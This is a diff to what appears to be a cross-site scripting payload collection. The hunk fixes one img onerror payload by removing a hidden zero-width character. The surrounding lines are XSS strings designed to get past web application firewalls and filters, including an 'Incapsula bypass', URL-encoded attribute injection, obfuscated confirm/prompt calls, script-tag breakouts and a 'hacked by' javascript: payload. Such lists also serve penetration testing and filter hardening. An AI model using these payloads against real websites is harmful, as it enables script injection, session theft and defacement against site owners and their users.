@@ -169,7 +169,7 @@ incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'as
 Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x20%3Bon%26%23x65%3Brror%3Dalert%28document.domain%29%26%23x3e%3B%22
 1"-top["con\146irm"](1)-"
 "></scri%0Apt><script>prompt(`Got%20an%20XSS%20would%20you%20like%20to%20say%20something?`)%3B<%2Fscript>
-1'"><img/src/onerror​=.1|alert``>
+1'"><img/src/onerror=.1|alert``>
 "><img src=x onerror=prompt(1);>
 xyz,test");alert(origin);//
 javascript​:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw originx
